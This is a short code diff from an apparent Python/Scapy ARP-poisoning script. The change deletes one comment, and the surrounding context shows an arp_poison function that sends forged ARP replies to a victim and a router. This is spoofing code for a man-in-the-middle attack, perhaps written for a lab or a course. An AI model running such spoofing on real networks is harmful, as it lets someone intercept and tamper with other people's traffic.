@@ -15,7 +15,6 @@ def find_mac_addr(ip, name):
 		return mac
 
 # This function run arp poisoning (deceive arp information, psrc is deceived)
-# Maybe hwsrc is filled with attacker's MAC address automatically
 def arp_poison(v_ip, r_ip, v_mac, r_mac):
 	send(ARP(op = 2, psrc = r_ip, pdst = v_ip, hwdst = v_mac))
 	send(ARP(op = 2, psrc = v_ip, pdst = r_ip, hwdst = r_mac))
